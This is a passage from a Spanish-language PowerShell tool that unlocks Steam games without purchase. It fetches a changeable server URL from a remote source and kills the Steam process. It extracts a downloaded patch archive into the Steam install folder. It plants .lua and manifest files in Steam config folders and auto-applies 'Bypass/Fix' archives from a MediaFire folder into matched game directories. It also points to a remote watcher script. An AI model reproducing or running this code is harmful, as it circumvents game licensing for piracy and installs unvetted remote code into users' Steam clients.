        $txtUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($apiResult.content))
        $txtUrl = $txtUrl.Trim()
        if ($txtUrl -match "^https?://") { $script:serverUrl = $txtUrl }
    } else { throw "API no response" }
} catch {
    try {
        $rawContent = Invoke-RestMethod -Uri "$script:ghUrlBase?r=$(Get-Random)" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        if ($rawContent -match '\$script:serverUrl\s*=\s*"(https?://[^"]+)"') {
            $fetchedUrl = $matches[1]
            if ($fetchedUrl -ne "https://EJEMPLO.lhr.life") { $script:serverUrl = $fetchedUrl }
        }
    } catch {}
}

# ---- MediaFire Download (segmented) ----
function Download-MediaFire {
    param([string]$url, [string]$outFile, $progressBar = $null, [int]$progressStart = 0, [int]$progressEnd = 100)
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if ($url -match "github\.com.*/raw/|githubusercontent\.com") {
        $dlUrl = $url; $cc = $null
    } else {
        $pageReq = [System.Net.HttpWebRequest]::Create($url)
        $pageReq.Method = "GET"; $pageReq.UserAgent = $ua; $pageReq.AllowAutoRedirect = $true
        $pageReq.Timeout = 30000; $pageReq.ReadWriteTimeout = 30000
        $pageReq.ServicePoint.Expect100Continue = $false; $pageReq.ServicePoint.UseNagleAlgorithm = $false
        $pageReq.ProtocolVersion = [System.Net.HttpVersion]::Version11; $pageReq.KeepAlive = $true
        $cc = New-Object System.Net.CookieContainer; $pageReq.CookieContainer = $cc
        $pageResp = $pageReq.GetResponse()
        $sr = New-Object System.IO.StreamReader $pageResp.GetResponseStream()
        $html = $sr.ReadToEnd()
        $sr.Close(); $pageResp.Close()
        $m = [regex]::Match($html, 'class="input\s+popsok"[^>]*href="([^"]+)"')
        if (-not $m.Success) { throw "No se pudo obtener el enlace de descarga de MediaFire." }
        $dlUrl = $m.Groups[1].Value
        $pageReq = $null; $pageResp = $null
    }
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 64
    [System.Net.ServicePointManager]::Expect100Continue = $false
    $headReq = [System.Net.HttpWebRequest]::Create($dlUrl)
    $headReq.Method = "HEAD"; $headReq.UserAgent = $ua; $headReq.AllowAutoRedirect = $true
    $headReq.Timeout = 15000
    if ($cc) { $headReq.CookieContainer = $cc }
    $headResp = $headReq.GetResponse()
    $totalSize = $headResp.ContentLength
    $headResp.Close()
    if ($totalSize -le 0) {
        $dlReq2 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq2.Method = "GET"; $dlReq2.UserAgent = $ua; $dlReq2.AllowAutoRedirect = $true
        $dlReq2.Timeout = 30000; $dlReq2.ReadWriteTimeout = 60000
        if ($cc) { $dlReq2.CookieContainer = $cc }
        $dlResp2 = $dlReq2.GetResponse()
        $totalSize = $dlResp2.ContentLength
        $str2 = $dlResp2.GetResponseStream(); $buf2 = New-Object byte[] 262144
        $fs2 = [System.IO.File]::Create($outFile); $tr = 0; $lp = -1
        try { while (($n2 = $str2.Read($buf2, 0, $buf2.Length)) -gt 0) { $fs2.Write($buf2, 0, $n2); $tr += $n2; if ($totalSize -gt 0 -and $progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr / $totalSize)); if ($pct -ne $lp) { $progressBar.Value = $pct; $lp = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str2.Close(); $fs2.Close(); $dlResp2.Close() }
        return
    }
    $connections = if ($totalSize -lt 5MB) { 1 } elseif ($totalSize -lt 50MB) { 4 } elseif ($totalSize -lt 500MB) { 8 } else { 16 }
    if ($connections -le 1) {
        $dlReq3 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq3.Method = "GET"; $dlReq3.UserAgent = $ua; $dlReq3.AllowAutoRedirect = $true
        $dlReq3.Timeout = 120000; $dlReq3.ReadWriteTimeout = 120000
        $dlReq3.ServicePoint.Expect100Continue = $false; $dlReq3.ServicePoint.UseNagleAlgorithm = $false
        $dlReq3.ProtocolVersion = [System.Net.HttpVersion]::Version11; $dlReq3.KeepAlive = $true
        if ($cc) { $dlReq3.CookieContainer = $cc }
        $dlResp3 = $dlReq3.GetResponse()
        $str3 = $dlResp3.GetResponseStream(); $buf3 = New-Object byte[] 262144
        $fs3 = [System.IO.File]::Create($outFile); $tr3 = 0; $lp3 = -1
        try { while (($n3 = $str3.Read($buf3, 0, $buf3.Length)) -gt 0) { $fs3.Write($buf3, 0, $n3); $tr3 += $n3; if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr3 / $totalSize)); if ($pct -ne $lp3) { $progressBar.Value = $pct; $lp3 = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str3.Close(); $fs3.Close(); $dlResp3.Close() }
        return
    }
    $chunkSize = [math]::Ceiling($totalSize / $connections)
    $tempDir = [System.IO.Path]::GetTempPath()
    $fileBase = [System.IO.Path]::GetFileNameWithoutExtension($outFile) + "_mfdl"
    $chunkFiles = @(); $runspaces = @(); $maxRetries = 3; $bufSize = 262144
    for ($i = 0; $i -lt $connections; $i++) {
        $start = $i * $chunkSize
        if ($start -ge $totalSize) { break }
        $end = [math]::Min($start + $chunkSize - 1, $totalSize - 1)
        $chunkFile = Join-Path $tempDir "${fileBase}_${i}.tmp"
        $chunkFiles += $chunkFile
        $cs = { param($u, $s, $e, $o, $ua2, $cc2, $bs, $mr)
            $le = $null
            for ($a = 1; $a -le $mr; $a++) {
                try {
                    $r = [System.Net.HttpWebRequest]::Create($u)
                    $r.Method = "GET"; $r.UserAgent = $ua2; $r.AllowAutoRedirect = $true
                    $r.Timeout = 120000; $r.ReadWriteTimeout = 120000
                    $r.ServicePoint.Expect100Continue = $false; $r.ServicePoint.UseNagleAlgorithm = $false
                    $r.ProtocolVersion = [System.Net.HttpVersion]::Version11; $r.KeepAlive = $true
                    if ($cc2) { $r.CookieContainer = $cc2 }
                    $r.AddRange($s, $e)
                    $rp = $r.GetResponse()
                    $f = [System.IO.File]::Create($o)
                    $st = $rp.GetResponseStream(); $b = New-Object byte[] $bs
                    while (($nr = $st.Read($b, 0, $bs)) -gt 0) { $f.Write($b, 0, $nr) }
                    $f.Close(); $st.Close(); $rp.Close()
                    return
                } catch { $le = $_; if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue } }
            }
            throw "Chunk failed after $mr attempts: $le"
        }
        $ps = [powershell]::Create(); $rs = [RunspaceFactory]::CreateRunspace()
        $ps.Runspace = $rs; $rs.Open()
        [void]$ps.AddScript($cs).AddArgument($dlUrl).AddArgument([long]$start).AddArgument([long]$end).AddArgument($chunkFile).AddArgument($ua).AddArgument($cc).AddArgument($bufSize).AddArgument($maxRetries)
        $runspaces += @{ps=$ps;handle=$ps.BeginInvoke();file=$chunkFile;rs=$rs}
    }
    $chunkErrors = @(); $completed = 0; $totalChunks = $runspaces.Count
    foreach ($rs2 in $runspaces) {
        try { $rs2.ps.EndInvoke($rs2.handle); $completed++ }
        catch { $chunkErrors += "[$($rs2.file)] $($_.Exception.Message)" }
        $rs2.ps.Dispose(); $rs2.rs.Dispose()
        if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $completed / $totalChunks)); $progressBar.Value = $pct; [System.Windows.Forms.Application]::DoEvents() }
    }
    if ($chunkErrors.Count -gt 0) {
        foreach ($cf in $chunkFiles) { if (Test-Path $cf) { Remove-Item $cf -Force -ErrorAction SilentlyContinue } }
        throw "Error en descarga segmentada: $($chunkErrors -join '; ')"
    }
    $fsOut = [System.IO.File]::Create($outFile)
    $mergeBuf = New-Object byte[] 1048576
    foreach ($cf in $chunkFiles) {
        $fsIn = [System.IO.File]::OpenRead($cf)
        while (($nm = $fsIn.Read($mergeBuf, 0, $mergeBuf.Length)) -gt 0) { $fsOut.Write($mergeBuf, 0, $nm) }
        $fsIn.Close()
    }
    $fsOut.Close()
    foreach ($cf in $chunkFiles) { Remove-Item $cf -Force -ErrorAction SilentlyContinue }
    $actualSize = (Get-Item $outFile).Length
    if ($actualSize -ne $totalSize) {
        Remove-Item $outFile -Force -ErrorAction SilentlyContinue
        throw "TamaÃƒÆ’Ã‚Â±o incorrecto: $actualSize vs $totalSize"
    }
    if ($progressBar) { $progressBar.Value = $progressEnd; [System.Windows.Forms.Application]::DoEvents() }
}

# ---- Extract and Install ----
function Extract-AndInstall {
    param([string]$zipPath, [string]$gameName = $null, $expirationDate = $null)
    $steamRoot = Get-SteamPath
    $luaDir = Join-Path $steamRoot "config\stplug-in"
    $luaDir2 = Join-Path $steamRoot "config\lua"
    $manifestDir = Join-Path $steamRoot "config\depotcache"
    if (-not (Test-Path $luaDir)) { New-Item -ItemType Directory -Path $luaDir -Force | Out-Null }
    if (-not (Test-Path $luaDir2)) { New-Item -ItemType Directory -Path $luaDir2 -Force | Out-Null }
    if (-not (Test-Path $manifestDir)) { New-Item -ItemType Directory -Path $manifestDir -Force | Out-Null }
    $tempDir = Join-Path $env:TEMP "bsmap_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $result = @{ lua = @(); manifest = @(); steamRoot = $steamRoot }
    try {
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
        if ($gameName -and $expirationDate) {
            $header = "-- BSMAP_EXPIRES:$($expirationDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gameName`n"
            Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object {
                try { $c = [System.IO.File]::ReadAllText($_.FullName); [System.IO.File]::WriteAllText($_.FullName, $header + $c) } catch {}
            }
        }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object { Copy-Item -Path $_.FullName -Destination $luaDir -Force; Copy-Item -Path $_.FullName -Destination $luaDir2 -Force; $result.lua += $_.Name }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { Copy-Item -Path $_.FullName -Destination $manifestDir -Force; $result.manifest += $_.Name }
    } finally {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $result
}

# ---- Game matching helpers ----
$WORKING_GAMES_FILE = Join-Path $env:LOCALAPPDATA "bsmap_working_games.json"
$AUTO_FIXED_FILE = Join-Path $env:LOCALAPPDATA "bsmap_auto_fixed.json"
$FIX_MANIFEST_FILE = Join-Path $env:LOCALAPPDATA "bsmap_fix_manifest.json"
$AUTO_FIX_EXCLUSIONS = @("resident evil 4", "re4")

function Expand-CamelCase {
    param([string]$s)
    $parts = @([regex]::Split($s, '(?<=[a-z])(?=[A-Z0-9])|(?<=[A-Z0-9])(?=[a-z])|[\s\._-]+') | Where-Object { $_ -and $_.Length -gt 0 })
    if ($parts.Count -le 1) { return $s }
    return ($parts | ForEach-Object { $_.ToLower() }) -join ' '
}

function Normalize-Name {
    param([string]$n)
    return ($n -replace '[^a-z0-9 ]', '').ToLower().Trim()
}

function Get-LevenshteinDistance {
    param([string]$a, [string]$b)
    $n = $a.Length; $m = $b.Length
    if ($n -eq 0) { return $m }; if ($m -eq 0) { return $n }
    $prev = New-Object int[] ($m + 1)
    $curr = New-Object int[] ($m + 1)
    for ($j = 0; $j -le $m; $j++) { $prev[$j] = $j }
    for ($i = 1; $i -le $n; $i++) {
        $curr[0] = $i
        for ($j = 1; $j -le $m; $j++) {
            $cost = if ($a[$i-1] -ceq $b[$j-1]) { 0 } else { 1 }
            $del = $prev[$j] + 1; $ins = $curr[$j-1] + 1; $sub = $prev[$j-1] + $cost
            $min = $del; if ($ins -lt $min) { $min = $ins }; if ($sub -lt $min) { $min = $sub }
            $curr[$j] = $min
        }
        $tmp = $prev; $prev = $curr; $curr = $tmp
    }
    return $prev[$m]
}

function Find-FixForGame {
    param([string]$gameFolderName, [hashtable]$fixes)
    if ($fixes.ContainsKey($gameFolderName)) { return $gameFolderName, $fixes[$gameFolderName] }
    $gfn = Normalize-Name $gameFolderName
    $gfnExpanded = Normalize-Name (Expand-CamelCase $gameFolderName)
    $bestFix = $null; $bestUrl = $null; $bestScore = 0
    foreach ($f in $fixes.Keys) {
        $ffn = Normalize-Name $f
        $ffnExpanded = Normalize-Name (Expand-CamelCase $f)
        if ($ffn -eq $gfn) { return $f, $fixes[$f] }
        if ($ffnExpanded -eq $gfnExpanded) { return $f, $fixes[$f] }
        $useGfn = $gfnExpanded; $useFfn = $ffnExpanded
        $maxLen = [Math]::Max($useFfn.Length, $useGfn.Length)
        $minLen = [Math]::Min($useFfn.Length, $useGfn.Length)
        if ($useFfn -like "*$useGfn*" -or $useGfn -like "*$useFfn*") {
            $shorter = if ($useFfn.Length -le $useGfn.Length) { $useFfn } else { $useGfn }
            $longer = if ($useFfn.Length -gt $useGfn.Length) { $useFfn } else { $useGfn }
            $isPrefix = $longer.StartsWith($shorter) -and $longer.Length -gt $shorter.Length
            $extraLen = if ($isPrefix) { $longer.Length - $shorter.Length } else { 0 }
            if ($isPrefix -and $extraLen -ge [Math]::Floor($shorter.Length * 0.3)) { }
            elseif ($minLen -ge $maxLen * 0.4) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
        }
    }
    return $bestFix, $bestUrl
}

function Apply-FixAutomatically {
    param([string]$gameFolderName, [string]$gamePath, [hashtable]$fixes)
    $fixName, $fixUrl = Find-FixForGame $gameFolderName $fixes
    if (-not $fixUrl) { return $false, "No hay reparacion disponible para $gameFolderName" }
    $zip = Join-Path $env:TEMP "auto_$(Get-Random).zip"
    try {
        Download-MediaFire $fixUrl $zip
        $extractedRelative = @()
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
            $z = [System.IO.Compression.ZipFile]::OpenRead($zip)
            foreach ($entry in $z.Entries) { if ($entry.Name) { $extractedRelative += $entry.FullName } }
            $z.Dispose()
        } catch {}
        Expand-Archive -Path $zip -DestinationPath $gamePath -Force
        if ($extractedRelative.Count -gt 0) { Add-FixManifestEntry $gameFolderName $gamePath $extractedRelative }
        Add-WorkingGame $gameFolderName
        Add-AutoFixedGame $gameFolderName
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        return $true, "Reparacion '$fixName' aplicada correctamente a $gameFolderName"
    } catch {
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        return $false, "Error al aplicar reparacion en $gameFolderName : $($_.Exception.Message)"
    }
}

function Get-WorkingGames {
    if (Test-Path $WORKING_GAMES_FILE) {
        try { $r = @(Get-Content $WORKING_GAMES_FILE -Raw | ConvertFrom-Json); return ,$r } catch {}
    }
    return @()
}

function Add-WorkingGame {
    param([string]$gameFolderName)
    $games = @(Get-WorkingGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $WORKING_GAMES_FILE -Force }
}

function Get-AutoFixedGames {
    if (Test-Path $AUTO_FIXED_FILE) {
        try { $list = @(Get-Content $AUTO_FIXED_FILE -Raw | ConvertFrom-Json); $r = @($list | Where-Object { -not (Should-ExcludeFromAutoFix $_) }); return ,$r } catch {}
    }
    return @()
}

function Add-AutoFixedGame {
    param([string]$gameFolderName)
    if (Should-ExcludeFromAutoFix $gameFolderName) { return }
    $games = @(Get-AutoFixedGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $AUTO_FIXED_FILE -Force }
}

function Should-ExcludeFromAutoFix {
    param([string]$gameName)
    $norm = Normalize-Name $gameName
    foreach ($ex in $AUTO_FIX_EXCLUSIONS) {
        if ($norm -match [regex]::Escape($ex)) { return $true }
        if ($norm -eq $ex) { return $true }
    }
    return $false
}

function Get-FixManifest {
    if (Test-Path $FIX_MANIFEST_FILE) { try { $r = @(Get-Content $FIX_MANIFEST_FILE -Raw | ConvertFrom-Json); return ,$r } catch {} }
    return @()
}

function Save-FixManifest {
    param([array]$manifest)
    $manifest | ConvertTo-Json | Set-Content $FIX_MANIFEST_FILE -Force
}

function Test-FixApplied {
    param([string]$gameName)
    $manifest = Get-FixManifest
    $entry = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -eq $gameName }
    if (-not $entry) { return $false }
    if (-not ($entry.game_root -and (Test-Path $entry.game_root))) { return $false }
    $allExist = $true
    foreach ($f in $entry.files) { $fp = Join-Path $entry.game_root $f; if (-not (Test-Path $fp)) { $allExist = $false; break } }
    return $allExist
}

function Add-FixManifestEntry {
    param([string]$gameName, [string]$gameRoot, [string[]]$newFiles)
    $manifest = Get-FixManifest
    $manifest = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -ne $gameName }
    $entry = [PSCustomObject]@{ game = $gameName; game_root = $gameRoot; files = @($newFiles) }
    $manifest += $entry
    Save-FixManifest $manifest
}

# ---- Direct activation (PARCHENEW, no code needed) ----
function Activar-Directo {
    try {
        $steamRoot = Get-SteamPath
        Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
        $zip = Join-Path $steamRoot "st_patch_$(Get-Random).zip"
        Download-MediaFire "https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip" $zip
        Expand-Archive -Path $zip -DestinationPath $steamRoot -Force
        Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
        if (Test-Path (Join-Path $steamRoot "steam.exe")) { Start-Process (Join-Path $steamRoot "steam.exe") }
        else { [System.Windows.Forms.MessageBox]::Show("No se pudo abrir Steam, abrelo manualmente.", "Aviso", "OK", "Warning") }
    } catch {
        Write-ErrorLog "Activar Directo" $_
        [System.Windows.Forms.MessageBox]::Show(($_ | Out-String), "Error Detallado", "OK", "Error")
    }
}

# ---- Repair helpers ----
function Get-FixesList {
    try {
        $r = Invoke-RestMethod -Uri "https://www.mediafire.com/api/1.5/folder/get_content.php?folder_key=3o9127pseyx49&response_format=json&content_type=files" -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    } catch { return @{} }
    $fixes = @{}
    if ($r.response.folder_content.files) {
        foreach ($f in $r.response.folder_content.files) {
            $name = $f.filename -replace '\.zip$', ''
            $fixes[$name] = $f.links.normal_download
        }
    }
    return $fixes
}

function Get-InstalledGames {
    $games = @{}
    foreach ($lib in Get-SteamLibraries) {
        $common = Join-Path $lib "steamapps\common"
        if (Test-Path $common) {
            Get-ChildItem -LiteralPath $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $games[$_.Name] = $_.FullName }
        }
    }
    return $games
}

function Get-SteamLibraries {
    $steamRoot = Get-SteamPath
    $libs = @($steamRoot)
    $vdf = Join-Path $steamRoot "steamapps\libraryfolders.vdf"
    if (Test-Path $vdf) {
        $v = Get-Content $vdf -Raw -ErrorAction SilentlyContinue
        [regex]::Matches($v, '"path"\s+"([^"]+)"') | ForEach-Object { $p = $_.Groups[1].Value; if (Test-Path $p) { $libs += $p } }
    }
    return $libs | Select-Object -Unique
}

function Find-GameFolder {
    param([string]$fixName, [hashtable]$games)
    $clean = $fixName -replace '(?i)\s*(UB|Ubisoft)?\s*(Bypass|Fix|Patch|Fix)\s*$', ''
    $clean = $clean -replace '(?i)\s*\(\d+\)\s*$', ''
    $clean = $clean -replace '_', ' '
    $clean = $clean.Trim()
    $fn = Normalize-Name $clean
    $fnWords = @($fn -split '\s+' | Where-Object { $_.Length -gt 0 })
    $bestMatch = $null; $bestScore = 0
    foreach ($g in $games.Keys) {
        $gfn = Normalize-Name $g
        $maxLen = [Math]::Max($fn.Length, $gfn.Length)
        $minLen = [Math]::Min($fn.Length, $gfn.Length)
        if ($fn -eq $gfn) { return $games[$g], $g }
        if ($fn -like "*$gfn*" -or $gfn -like "*$fn*") {
            $shorter = if ($fn.Length -le $gfn.Length) { $fn } else { $gfn }
            $longer = if ($fn.Length -gt $gfn.Length) { $fn } else { $gfn }
            if ($minLen -ge $maxLen * 0.6) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
        $gWords = @($gfn -split '\s+' | Where-Object { $_.Length -gt 0 })
        $common = 0
        foreach ($w in $fnWords) {
            foreach ($gw in $gWords) {
                if ($w -eq $gw) { $common++; break }
                if ($w -like "*$gw*" -or $gw -like "*$w*") { $common += 0.5; break }
            }
        }
        $total = [Math]::Max($fnWords.Count, $gWords.Count)
        if ($total -gt 0) {
            $ratio = $common / $total
            if ($ratio -ge 0.4 -and $ratio -gt $bestScore) { $bestScore = $ratio; $bestMatch = $g }
        }
        if ($maxLen -gt 3) {
            $dist = Get-LevenshteinDistance $fn $gfn
            $threshold = [Math]::Max(1, [Math]::Floor($maxLen * 0.2))
            if ($dist -le $threshold) { $score = $maxLen - $dist; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
    }
    if ($bestMatch) { return $games[$bestMatch], $bestMatch }
    return $null, $null
}

# ---- Countdown system ----
$script:countdownText = $null
$script:countdownTick = $null

function Start-Countdown {
    param([int]$durationSec, [datetime]$expDate, [string]$gameName)
    if ($script:countdownTick) { $script:countdownTick.Stop(); $script:countdownTick.Dispose() }
    $script:countdownTick = New-Object System.Windows.Forms.Timer
    $script:countdownTick.Interval = 1000
    $script:countdownTick.Tag = @{ endTime = $expDate; gameName = $gameName }
    $script:countdownTick.Add_Tick({
        $now = Get-Date; $end = $this.Tag.endTime; $g = $this.Tag.gameName
        $left = ($end - $now).TotalSeconds
        if ($left -le 0) {
            $this.Stop()
            $script:countdownText = $null
            Remove-ExpiredTimers | Out-Null
            [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", "Tiempo Expirado", "OK", "Information")
        }
    })
    $script:countdownTick.Start()
}

# Timer list (backed by timers file)
$script:refreshTimers = New-Object System.Windows.Forms.Timer
$script:refreshTimers.Interval = 5000
$script:refreshTimers.Add_Tick({ Remove-ExpiredTimers | Out-Null; Sync-ActiveCodesFromTimers; Refresh-Codes })
$script:refreshTimers.Start()

# URL checker every 60s
$script:urlChecker = New-Object System.Windows.Forms.Timer
$script:urlChecker.Interval = 60000
$script:urlChecker.Add_Tick({ Update-ServerUrl })
$script:urlChecker.Start()

# Download watcher variables
$script:fixesCacheTime = (Get-Date).AddDays(-1)
$script:fixesCache = @{}
$script:fixesJob = $null
$script:fixedNewGames = @{}
$script:fixJobs = @{}
$script:steamLibsCacheTime = Get-Date
$script:downloadPendingFixes = @{}
$script:knownDownloading = @{}
$script:commonFolderCache = @{}
${script:watcherUrl} = "https://raw.githubusercontent.com/bastisayes/steamsito/main/download_watcher.ps1"

$script:langs = @{
    "es" = @{ activar="Activar +300";activarSub="Activa mas de 300 juegos"
        idioma="Idioma";idiomaSub="Cambiar idioma";desinstalar="Desinstalar";desinstalarSub="Eliminar juegos"
        web="Pagina Web";webSub="Visitar sitio oficial"
        config="Configuracion";configSub="Ajustes del programa";watcherOn="Watcher: ACTIVADO";watcherOff="Watcher: DESACTIVADO"
        borrarHist="Borrar historial de codigos";borrarHistSub="Elimina el registro de codigos activos"
        limpieza="LIMPIEZA";limpiezaSub="Elimina procesos, luas y registro"
        histBorrado="Historial borrado";histBorradoMsg="Se eliminaron todos los codigos activos del registro."
        discord="Discord";discordSub="Unite a nuestro servidor";tiktok="TikTok";tiktokSub="Seguinos en TikTok"
        salir="Salir";canjear="Canjear Codigo";canjearSub="Ingresa tu codigo para desbloquear juegos"
        canjearBtn="Canjear";pegarBtn="Pegar";volver="Volver";codigosActivos="Codigos Activos"
        sinCodigos="No hay codigos activos";sinCodigosSub="Ingresa un codigo arriba para activar juegos"
        errorCodigo="Ingresa un codigo valido.";verificando="Verificando codigo..."
        exito="Codigo canjeado exitosamente!";expirado="EXPIRADO";activo="ACTIVO"
        expiraEn="EXPIRA EN";dias="DIAS";dia="DIA";expira="Expira:";juegoAct="Juego activado"
        selectIdioma="Seleccionar Idioma";proximamente="Proximamente." }
    "en" = @{ activar="Activate +300";activarSub="Activate over 300 games"
        idioma="Language";idiomaSub="Change language";desinstalar="Uninstall";desinstalarSub="Remove games"
        web="Website";webSub="Visit official site"
        config="Settings";configSub="Program settings";watcherOn="Watcher: ON";watcherOff="Watcher: OFF"
        borrarHist="Clear codes history";borrarHistSub="Remove active code records"
        limpieza="CLEANUP";limpiezaSub="Kill processes, remove luas and history"
        histBorrado="History cleared";histBorradoMsg="All active codes have been removed from the registry."
        discord="Discord";discordSub="Join our server";tiktok="TikTok";tiktokSub="Follow us on TikTok"
        salir="Exit";canjear="Redeem Code";canjearSub="Enter your code to unlock games"
        canjearBtn="Redeem";pegarBtn="Paste";volver="Back";codigosActivos="Active Codes"
        sinCodigos="No active codes";sinCodigosSub="Enter a code above to activate games"
        errorCodigo="Enter a valid code.";verificando="Verifying code..."
        exito="Code redeemed successfully!";expirado="EXPIRED";activo="ACTIVE"
        expiraEn="EXPIRES IN";dias="DAYS";dia="DAY";expira="Expires:";juegoAct="Game activated"
        selectIdioma="Select Language";proximamente="Coming soon." }
    "pt" = @{ activar="Ativar +300";activarSub="Ative mais de 300 jogos"
        idioma="Idioma";idiomaSub="Mudar idioma";desinstalar="Desinstalar";desinstalarSub="Remover jogos"
        web="Pagina Web";webSub="Visitar site oficial"
        config="Configuracoes";configSub="Ajustes do programa";watcherOn="Watcher: ATIVADO";watcherOff="Watcher: DESATIVADO"
        borrarHist="Limpar historico de codigos";borrarHistSub="Remove registros de codigos ativos"
        limpieza="LIMPEZA";limpiezaSub="Mata processos, remove luas e historico"
        histBorrado="Historico limpo";histBorradoMsg="Todos os codigos ativos foram removidos do registro."
        discord="Discord";discordSub="Entre no nosso servidor";tiktok="TikTok";tiktokSub="Siga-nos no TikTok"
        salir="Sair";canjear="Resgatar Codigo";canjearSub="Insira seu codigo para desbloquear jogos"
        canjearBtn="Resgatar";pegarBtn="Colar";volver="Voltar";codigosActivos="Codigos Ativos"
        sinCodigos="Nenhum codigo ativo";sinCodigosSub="Insira um codigo acima para ativar jogos"
        errorCodigo="Insira um codigo valido.";verificando="Verificando codigo..."
        exito="Codigo resgatado com sucesso!";expirado="EXPIRADO";activo="ATIVO"
        expiraEn="EXPIRA EM";dias="DIAS";dia="DIA";expira="Expira:";juegoAct="Jogo ativado"
        selectIdioma="Selecionar Idioma";proximamente="Em breve." }
}
$script:currentLang = "es"
function T([string]$k){ return $script:langs[$script:currentLang][$k] }

